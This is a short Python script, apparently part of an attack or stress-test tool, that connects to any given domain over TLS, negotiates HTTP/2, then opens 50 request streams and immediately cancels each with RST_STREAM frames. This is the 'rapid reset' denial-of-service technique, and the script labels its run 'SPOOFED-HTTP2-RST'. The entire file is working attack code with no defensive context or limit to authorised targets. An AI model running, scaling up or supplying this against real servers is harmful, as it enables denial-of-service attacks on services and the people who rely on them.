import socket
import ssl
import time
from h2.connection import H2Connection
from h2.events import SettingsAcknowledged

NUM_STREAMS = 50

def run_http2_rst(domain):
    print(f"[+] Running SPOOFED-HTTP2-RST on {domain}")

    context = ssl.create_default_context()
    context.set_alpn_protocols(["h2"])

    try:
        with socket.create_connection((domain, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as tls:
                negotiated = tls.selected_alpn_protocol()
                if negotiated != "h2":
                    print("[-] HTTP/2 not supported on this server")
                    return

                conn = H2Connection()
                conn.initiate_connection()
                tls.sendall(conn.data_to_send())

                data = tls.recv(65535)
                conn.receive_data(data)

                for _ in range(NUM_STREAMS):
                    stream_id = conn.get_next_available_stream_id()
                    conn.send_headers(stream_id, [
                        (":method", "GET"),
                        (":authority", domain),
                        (":scheme", "https"),
                        (":path", "/")
                    ])
                    conn.reset_stream(stream_id)

                tls.sendall(conn.data_to_send())
                print(f"[✓] Sent {NUM_STREAMS} RST_STREAM frames.")
    except Exception as e:
        print(f"[!] HTTP/2 RST error: {e}")